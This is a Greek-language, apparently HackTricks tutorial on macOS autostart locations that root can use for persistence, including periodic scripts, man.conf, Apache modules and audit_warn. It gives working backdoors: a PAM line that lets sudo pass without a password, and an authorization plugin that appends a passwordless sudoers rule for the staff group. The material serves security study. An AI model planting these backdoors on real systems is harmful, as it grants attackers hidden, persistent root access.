> Εδώ μπορείτε να βρείτε start locations χρήσιμα για **sandbox bypass**, τα οποία σας επιτρέπουν να εκτελέσετε κάτι απλώς **γράφοντάς το σε ένα αρχείο**, έχοντας **root** ή/και απαιτώντας άλλες **περίεργες συνθήκες.**

### Periodic

Writeup: [https://theevilbit.github.io/beyond/beyond_0019/](https://theevilbit.github.io/beyond/beyond_0019/)

- Χρήσιμο για sandbox bypass: [🟠](https://emojipedia.org/large-orange-circle)
- Αλλά πρέπει να είστε root
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- `/etc/periodic/daily`, `/etc/periodic/weekly`, `/etc/periodic/monthly`, `/usr/local/etc/periodic`
- Απαιτείται root
- **Trigger**: Όταν έρθει η κατάλληλη στιγμή
- `/etc/daily.local`, `/etc/weekly.local` ή `/etc/monthly.local`
- Απαιτείται root
- **Trigger**: Όταν έρθει η κατάλληλη στιγμή

#### Description & Exploitation

Τα periodic scripts (**`/etc/periodic`**) εκτελούνται λόγω των **launch daemons** που έχουν ρυθμιστεί στο `/System/Library/LaunchDaemons/com.apple.periodic*`. Σημειώστε ότι τα scripts που είναι αποθηκευμένα στο `/etc/periodic/` **εκτελούνται** ως ο **owner του αρχείου**, επομένως αυτό δεν θα λειτουργήσει για πιθανό privilege escalation.
```bash
# Launch daemons that will execute the periodic scripts
ls -l /System/Library/LaunchDaemons/com.apple.periodic*
-rw-r--r--  1 root  wheel  887 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-daily.plist
-rw-r--r--  1 root  wheel  895 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-monthly.plist
-rw-r--r--  1 root  wheel  891 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-weekly.plist

# The scripts located in their locations
ls -lR /etc/periodic
total 0
drwxr-xr-x  11 root  wheel  352 May 13 00:29 daily
drwxr-xr-x   5 root  wheel  160 May 13 00:29 monthly
drwxr-xr-x   3 root  wheel   96 May 13 00:29 weekly

/etc/periodic/daily:
total 72
-rwxr-xr-x  1 root  wheel  1642 May 13 00:29 110.clean-tmps
-rwxr-xr-x  1 root  wheel   695 May 13 00:29 130.clean-msgs
[...]

/etc/periodic/monthly:
total 24
-rwxr-xr-x  1 root  wheel   888 May 13 00:29 199.rotate-fax
-rwxr-xr-x  1 root  wheel  1010 May 13 00:29 200.accounting
-rwxr-xr-x  1 root  wheel   606 May 13 00:29 999.local

/etc/periodic/weekly:
total 8
-rwxr-xr-x  1 root  wheel  620 May 13 00:29 999.local
```
Υπάρχουν και άλλα periodic scripts που θα εκτελούνται, όπως υποδεικνύεται στο **`/etc/defaults/periodic.conf`**:
```bash
grep "Local scripts" /etc/defaults/periodic.conf
daily_local="/etc/daily.local"				# Local scripts
weekly_local="/etc/weekly.local"			# Local scripts
monthly_local="/etc/monthly.local"			# Local scripts
```
Αν καταφέρετε να γράψετε σε οποιοδήποτε από τα αρχεία `/etc/daily.local`, `/etc/weekly.local` ή `/etc/monthly.local`, αυτό θα **εκτελεστεί αργά ή γρήγορα**.

> [!WARNING]
> Σημειώστε ότι το periodic script θα **εκτελεστεί ως ο owner του script**. Επομένως, αν το script ανήκει σε έναν κανονικό χρήστη, θα εκτελεστεί ως αυτός ο χρήστης (αυτό μπορεί να αποτρέψει privilege escalation attacks).

### PAM

Writeup: [Linux Hacktricks PAM](../linux-hardening/software-information/pam-pluggable-authentication-modules.md)\
Writeup: [https://theevilbit.github.io/beyond/beyond_0005/](https://theevilbit.github.io/beyond/beyond_0005/)

- Χρήσιμο για bypass του sandbox: [🟠](https://emojipedia.org/large-orange-circle)
- Ωστόσο, πρέπει να είστε root
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Τοποθεσία

- Απαιτείται πάντα root

#### Περιγραφή & Exploitation

Καθώς το PAM επικεντρώνεται περισσότερο στο **persistence** και στο malware παρά στην εύκολη εκτέλεση μέσα στο macOS, αυτό το blog δεν θα δώσει λεπτομερή εξήγηση· **διαβάστε τα writeups για να κατανοήσετε καλύτερα αυτή την τεχνική**.

Ελέγξτε τα PAM modules με:
```bash
ls -l /etc/pam.d
```
Μια τεχνική persistence/privilege escalation που κάνει κατάχρηση του PAM είναι τόσο απλή όσο η τροποποίηση του module /etc/pam.d/sudo, προσθέτοντας στην αρχή τη γραμμή:
```bash
auth       sufficient     pam_permit.so
```
Έτσι θα **μοιάζει** κάπως έτσι:
```bash
# sudo: auth account password session
auth       sufficient     pam_permit.so
auth       include        sudo_local
auth       sufficient     pam_smartcard.so
auth       required       pam_opendirectory.so
account    required       pam_permit.so
password   required       pam_deny.so
session    required       pam_permit.so
```
Και επομένως οποιαδήποτε προσπάθεια χρήσης του **`sudo` θα λειτουργήσει**.

> [!CAUTION]
> Σημειώστε ότι αυτός ο κατάλογος προστατεύεται από το TCC, επομένως είναι πολύ πιθανό ο χρήστης να λάβει ένα prompt που θα ζητά πρόσβαση.

Ένα ακόμη καλό παράδειγμα είναι το su, όπου μπορείτε να δείτε ότι είναι επίσης δυνατό να δοθούν παράμετροι στα PAM modules (και θα μπορούσατε επίσης να κάνετε backdoor σε αυτό το αρχείο):
```bash
cat /etc/pam.d/su
# su: auth account session
auth       sufficient     pam_rootok.so
auth       required       pam_opendirectory.so
account    required       pam_group.so no_warn group=admin,wheel ruser root_only fail_safe
account    required       pam_opendirectory.so no_check_shell
password   required       pam_opendirectory.so
session    required       pam_launchd.so
```
### Authorization Plugins

Writeup: [https://theevilbit.github.io/beyond/beyond_0028/](https://theevilbit.github.io/beyond/beyond_0028/)\
Writeup: [https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65](https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65)

- Χρήσιμο για bypass του sandbox: [🟠](https://emojipedia.org/large-orange-circle)
- Αλλά πρέπει να είστε root και να κάνετε επιπλέον ρυθμίσεις
- TCC bypass: ???

#### Τοποθεσία

- `/Library/Security/SecurityAgentPlugins/`
- Απαιτείται root
- Χρειάζεται επίσης να ρυθμίσετε τη βάση δεδομένων authorization ώστε να χρησιμοποιεί το plugin

#### Περιγραφή & Εκμετάλλευση

Μπορείτε να δημιουργήσετε ένα authorization plugin που θα εκτελείται όταν ένας χρήστης κάνει login, ώστε να διατηρήσετε persistence. Για περισσότερες πληροφορίες σχετικά με τη δημιουργία ενός τέτοιου plugin, δείτε τα προηγούμενα writeups (και προσέξτε, επειδή ένα κακογραμμένο plugin μπορεί να σας κλειδώσει εκτός συστήματος και θα χρειαστεί να καθαρίσετε το Mac σας από το recovery mode).
```objectivec
// Compile the code and create a real bundle
// gcc -bundle -framework Foundation main.m -o CustomAuth
// mkdir -p CustomAuth.bundle/Contents/MacOS
// mv CustomAuth CustomAuth.bundle/Contents/MacOS/

#import <Foundation/Foundation.h>

__attribute__((constructor)) static void run()
{
NSLog(@"%@", @"[+] Custom Authorization Plugin was loaded");
system("echo \"%staff ALL=(ALL) NOPASSWD:ALL\" >> /etc/sudoers");
}
```
**Μετακινήστε** το bundle στη θέση όπου θα φορτωθεί:
```bash
cp -r CustomAuth.bundle /Library/Security/SecurityAgentPlugins/
```
Τέλος, προσθέστε τον **κανόνα** για τη φόρτωση αυτού του Plugin:
```bash
cat > /tmp/rule.plist <<EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>class</key>
<string>evaluate-mechanisms</string>
<key>mechanisms</key>
<array>
<string>CustomAuth:login,privileged</string>
</array>
</dict>
</plist>
EOF

security authorizationdb write com.asdf.asdf < /tmp/rule.plist
```
Το **`evaluate-mechanisms`** θα ενημερώσει το authorization framework ότι θα χρειαστεί να **καλέσει έναν εξωτερικό μηχανισμό για authorization**. Επιπλέον, το **`privileged`** θα προκαλέσει την εκτέλεσή του από τον root.

Ενεργοποιήστε το με:
```bash
security authorize com.asdf.asdf
```
Και τότε η ομάδα **staff θα πρέπει να έχει sudo** πρόσβαση (διαβάστε το `/etc/sudoers` για επιβεβαίωση).

### Man.conf

Αναφορά: [https://theevilbit.github.io/beyond/beyond_0030/](https://theevilbit.github.io/beyond/beyond_0030/)

- Χρήσιμο για παράκαμψη του sandbox: [🟠](https://emojipedia.org/large-orange-circle)
- Αλλά πρέπει να είστε root και ο χρήστης πρέπει να χρησιμοποιεί το man
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Τοποθεσία

- **`/private/etc/man.conf`**
- Απαιτείται root
- **`/private/etc/man.conf`**: Κάθε φορά που χρησιμοποιείται το man

#### Περιγραφή & Exploit

Το αρχείο ρυθμίσεων **`/private/etc/man.conf`** υποδεικνύει το binary/script που θα χρησιμοποιείται κατά το άνοιγμα αρχείων τεκμηρίωσης του man. Επομένως, η διαδρομή προς το εκτελέσιμο μπορεί να τροποποιηθεί, ώστε κάθε φορά που ο χρήστης χρησιμοποιεί το man για να διαβάσει κάποια τεκμηρίωση να εκτελείται ένα backdoor.

Για παράδειγμα, ορίστε στο **`/private/etc/man.conf`**:
```
MANPAGER /tmp/view
```
Και στη συνέχεια δημιουργήστε το `/tmp/view` ως εξής:
```bash
#!/bin/zsh

touch /tmp/manconf

/usr/bin/less -s
```
### Apache2

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0023/](https://theevilbit.github.io/beyond/beyond_0023/)

- Χρήσιμο για παράκαμψη του sandbox: [🟠](https://emojipedia.org/large-orange-circle)
- Ωστόσο, πρέπει να είστε root και το apache πρέπει να εκτελείται
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
- Το Httpd δεν διαθέτει entitlements

#### Τοποθεσία

- **`/etc/apache2/httpd.conf`**
- Απαιτούνται δικαιώματα root
- Trigger: Κατά την εκκίνηση του Apache2

#### Περιγραφή & Exploit

Μπορείτε να υποδείξετε στο `/etc/apache2/httpd.conf` τη φόρτωση ενός module, προσθέτοντας μια γραμμή όπως:
```bash
LoadModule my_custom_module /Users/Shared/example.dylib "My Signature Authority"
```
Με αυτόν τον τρόπο, το compiled module σας θα φορτωθεί από το Apache. Το μόνο που χρειάζεται είναι είτε να το **υπογράψετε με ένα έγκυρο Apple certificate**, είτε να **προσθέσετε ένα νέο trusted certificate** στο σύστημα και να το **υπογράψετε** με αυτό.

Στη συνέχεια, αν χρειάζεται, για να βεβαιωθείτε ότι ο server θα ξεκινήσει, μπορείτε να εκτελέσετε:
```bash
sudo launchctl load -w /System/Library/LaunchDaemons/org.apache.httpd.plist
```
Παράδειγμα κώδικα για το Dylb:
```objectivec
#include <stdio.h>
#include <syslog.h>

__attribute__((constructor))
static void myconstructor(int argc, const char **argv)
{
printf("[+] dylib constructor called from %s\n", argv[0]);
syslog(LOG_ERR, "[+] dylib constructor called from %s\n", argv[0]);
}
```
### BSM audit framework

Writeup: [https://theevilbit.github.io/beyond/beyond_0031/](https://theevilbit.github.io/beyond/beyond_0031/)

- Χρήσιμο για bypass του sandbox: [🟠](https://emojipedia.org/large-orange-circle)
- Αλλά πρέπει να είστε root, να εκτελείται το auditd και να προκαλέσετε μια προειδοποίηση
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Τοποθεσία

- **`/etc/security/audit_warn`**
- Απαιτείται root
- **Trigger**: Όταν το auditd εντοπίζει μια προειδοποίηση

#### Περιγραφή & Exploit

Κάθε φορά που το auditd εντοπίζει μια προειδοποίηση, το script **`/etc/security/audit_warn`** **εκτελείται**. Επομένως, μπορείτε να προσθέσετε το payload σας σε αυτό.
```bash
echo "touch /tmp/auditd_warn" >> /etc/security/audit_warn
```
Μπορείτε να προκαλέσετε μια προειδοποίηση με το `sudo audit -n`.

### Startup Items

> [!CAUTION] > **Αυτό έχει καταργηθεί, επομένως δεν θα πρέπει να βρεθεί τίποτα σε αυτούς τους καταλόγους.**

Το **StartupItem** είναι ένας κατάλογος που πρέπει να βρίσκεται είτε στο `/Library/StartupItems/` είτε στο `/System/Library/StartupItems/`. Μόλις δημιουργηθεί αυτός ο κατάλογος, πρέπει να περιλαμβάνει δύο συγκεκριμένα αρχεία:

1. Ένα **rc script**: Ένα shell script που εκτελείται κατά την εκκίνηση.
2. Ένα **plist file**, με συγκεκριμένο όνομα `StartupParameters.plist`, το οποίο περιέχει διάφορες ρυθμίσεις διαμόρφωσης.

Βεβαιωθείτε ότι τόσο το rc script όσο και το αρχείο `StartupParameters.plist` έχουν τοποθετηθεί σωστά μέσα στον κατάλογο **StartupItem**, ώστε η διαδικασία εκκίνησης να τα αναγνωρίζει και να τα χρησιμοποιεί.

{{#tabs}}
{{#tab name="StartupParameters.plist"}}
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Description</key>
<string>This is a description of this service</string>
<key>OrderPreference</key>
<string>None</string> <!--Other req services to execute before this -->
<key>Provides</key>
<array>
<string>superservicename</string> <!--Name of the services provided by this file -->
</array>
</dict>
</plist>
```
{{#endtab}}

{{#tab name="superservicename"}}
```bash
#!/bin/sh
. /etc/rc.common

StartService(){
touch /tmp/superservicestarted
}

StopService(){
rm /tmp/superservicestarted
}

RestartService(){
echo "Restarting"
}

RunService "$1"
```
{{#endtab}}
{{#endtabs}}

### ~~emond~~

> [!CAUTION]
> Δεν μπορώ να βρω αυτό το component στο macOS μου, επομένως για περισσότερες πληροφορίες ελέγξτε το writeup

Writeup: [https://theevilbit.github.io/beyond/beyond_0023/](https://theevilbit.github.io/beyond/beyond_0023/)

Το **emond**, που εισήχθη από την Apple, είναι ένας μηχανισμός καταγραφής που φαίνεται να βρίσκεται σε ημιτελή ανάπτυξη ή πιθανώς να έχει εγκαταλειφθεί, αλλά παραμένει προσβάσιμος. Αν και δεν προσφέρει ιδιαίτερο όφελος σε έναν Mac administrator, αυτή η άγνωστη υπηρεσία θα μπορούσε να χρησιμοποιηθεί ως διακριτική μέθοδος persistence από threat actors, πιθανότατα χωρίς να γίνει αντιληπτή από τους περισσότερους macOS admins.

Για όσους γνωρίζουν την ύπαρξή του, ο εντοπισμός τυχόν κακόβουλης χρήσης του **emond** είναι απλός. Το LaunchDaemon του συστήματος για αυτή την υπηρεσία αναζητά scripts προς εκτέλεση σε έναν συγκεκριμένο κατάλογο. Για να το ελέγξετε, μπορεί να χρησιμοποιηθεί η ακόλουθη εντολή:
```bash
ls -l /private/var/db/emondClients
```
### ~~XQuartz~~

Writeup: [https://theevilbit.github.io/beyond/beyond_0018/](https://theevilbit.github.io/beyond/beyond_0018/)

#### Τοποθεσία

- **`/opt/X11/etc/X11/xinit/privileged_startx.d`**
- Απαιτούνται δικαιώματα root
- **Trigger**: Με XQuartz

#### Περιγραφή & Exploit

Το XQuartz **δεν είναι πλέον εγκατεστημένο στο macOS**, επομένως, αν θέλετε περισσότερες πληροφορίες, δείτε το writeup.

### ~~kext~~

> [!CAUTION]
> Είναι τόσο περίπλοκη η εγκατάσταση ενός kext ακόμη και ως root, ώστε δεν θα το θεωρούσα τρόπο διαφυγής από sandboxes ή ακόμη και persistence (εκτός αν έχετε κάποιο exploit)

#### Τοποθεσία

Για να εγκαταστήσετε ένα KEXT ως στοιχείο εκκίνησης, πρέπει να **εγκατασταθεί σε μία από τις ακόλουθες τοποθεσίες**:

- `/System/Library/Extensions`
- Αρχεία KEXT ενσωματωμένα στο λειτουργικό σύστημα OS X.
- `/Library/Extensions`
- Αρχεία KEXT που εγκαθίστανται από λογισμικό τρίτων

Μπορείτε να εμφανίσετε τα φορτωμένα kext αρχεία με:
```bash
kextstat #List loaded kext
kextload /path/to/kext.kext #Load a new one based on path
kextload -b com.apple.driver.ExampleBundle #Load a new one based on path
kextunload /path/to/kext.kext
kextunload -b com.apple.driver.ExampleBundle
```
Για περισσότερες πληροφορίες σχετικά με τα [**kernel extensions δείτε αυτή την ενότητα**](macos-security-and-privilege-escalation/mac-os-architecture/index.html#i-o-kit-drivers).

### ~~amstoold~~

Writeup: [https://theevilbit.github.io/beyond/beyond_0029/](https://theevilbit.github.io/beyond/beyond_0029/)

#### Τοποθεσία

- **`/usr/local/bin/amstoold`**
- Απαιτούνται δικαιώματα root

#### Περιγραφή & Exploitation

Apparently, το `plist` από το `/System/Library/LaunchAgents/com.apple.amstoold.plist` χρησιμοποιούσε αυτό το binary ενώ εξέθετε μια υπηρεσία XPC... Το πρόβλημα ήταν ότι το binary δεν υπήρχε, οπότε μπορούσες να τοποθετήσεις κάτι εκεί και, όταν καλούνταν η υπηρεσία XPC, θα καλούνταν το binary σου.

Δεν μπορώ πλέον να το βρω στο macOS μου.

### ~~xsanctl~~

Writeup: [https://theevilbit.github.io/beyond/beyond_0015/](https://theevilbit.github.io/beyond/beyond_0015/)

#### Τοποθεσία

- **`/Library/Preferences/Xsan/.xsanrc`**
- Απαιτούνται δικαιώματα root
- **Trigger**: Όταν εκτελείται η υπηρεσία (σπάνια)

#### Περιγραφή & exploit

Apparently, δεν είναι πολύ συνηθισμένο να εκτελείται αυτό το script και δεν μπόρεσα καν να το βρω στο macOS μου, επομένως, αν θέλεις περισσότερες πληροφορίες, δες το writeup.

### ~~/etc/rc.common~~

> [!CAUTION] > **Αυτό δεν λειτουργεί σε σύγχρονες εκδόσεις του MacOS**

Είναι επίσης δυνατό να τοποθετήσεις εδώ **commands που θα εκτελούνται κατά την εκκίνηση.** Παράδειγμα κανονικού rc.common script:
```bash
#
# Common setup for startup scripts.
#
# Copyright 1998-2002 Apple Computer, Inc.
#

######################
# Configure the shell #
######################

#
# Be strict
#
#set -e
set -u

#
# Set command search path
#
PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/libexec:/System/Library/CoreServices; export PATH

#
# Set the terminal mode
#
#if [ -x /usr/bin/tset ] && [ -f /usr/share/misc/termcap ]; then
#    TERM=$(tset - -Q); export TERM
#fi

###################
# Useful functions #
###################

#
# Determine if the network is up by looking for any non-loopback
# internet network interfaces.
#
CheckForNetwork()
{
local test

if [ -z "${NETWORKUP:=}" ]; then
test=$(ifconfig -a inet 2>/dev/null | sed -n -e '/127.0.0.1/d' -e '/0.0.0.0/d' -e '/inet/p' | wc -l)
if [ "${test}" -gt 0 ]; then
NETWORKUP="-YES-"
else
NETWORKUP="-NO-"
fi
fi
}

alias ConsoleMessage=echo

#
# Process management
#
GetPID ()
{
local program="$1"
local pidfile="${PIDFILE:=/var/run/${program}.pid}"
local     pid=""

if [ -f "${pidfile}" ]; then
pid=$(head -1 "${pidfile}")
if ! kill -0 "${pid}" 2> /dev/null; then
echo "Bad pid file $pidfile; deleting."
pid=""
rm -f "${pidfile}"
fi
fi

if [ -n "${pid}" ]; then
echo "${pid}"
return 0
else
return 1
fi
}

#
# Generic action handler
#
RunService ()
{
case $1 in
start  ) StartService   ;;
stop   ) StopService    ;;
restart) RestartService ;;
*      ) echo "$0: unknown argument: $1";;
esac
}
```
## Τεχνικές persistence και εργαλεία

- [https://github.com/cedowens/Persistent-Swift](https://github.com/cedowens/Persistent-Swift)
- [https://github.com/D00MFist/PersistentJXA](https://github.com/D00MFist/PersistentJXA)

## Αναφορές

- [2025, the year of the Infostealer](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)

{{#include ../banners/hacktricks-training.md}}
